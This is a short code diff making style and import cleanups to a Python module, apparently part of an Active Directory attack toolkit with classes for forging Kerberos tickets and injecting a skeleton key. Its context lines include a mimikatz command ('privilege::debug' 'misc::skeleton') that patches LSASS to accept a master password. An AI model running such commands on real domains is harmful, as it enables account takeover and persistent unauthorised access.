@@ -12,19 +12,15 @@ Skeleton key: Patch LSASS to accept a master password for any account (via mimik
 
 from __future__ import annotations
 
-import hashlib
-import hmac
 import struct
 import time
 from dataclasses import dataclass, field
-from typing import Any, Optional
+from typing import Any
 
 from modules.kerberos_core import (
     KerberosCore,
     KerberosCrypto,
     TGSRequest,
-    ENCRYPTION_TYPES,
-    KERB_TICKET_FLAGS,
 )
 
 TICKET_FLAG_FORWARDABLE = 0x40000000
@@ -470,7 +466,7 @@ class SapphireTicketForger:
     ticket for any user to a service where RBCD is configured.
     """
 
-    def __init__(self, kerberos_core: Optional[KerberosCore] = None):
+    def __init__(self, kerberos_core: KerberosCore | None = None):
         self.kerberos = kerberos_core or KerberosCore()
 
     def forge_s4u2self(
@@ -608,7 +604,7 @@ class SkeletonKeyInjector:
         Returns:
             mimikatz command string.
         """
-        return f'mimikatz.exe "privilege::debug" "misc::skeleton" exit'
+        return 'mimikatz.exe "privilege::debug" "misc::skeleton" exit'
 
     @staticmethod
     def cleanup_command() -> str:
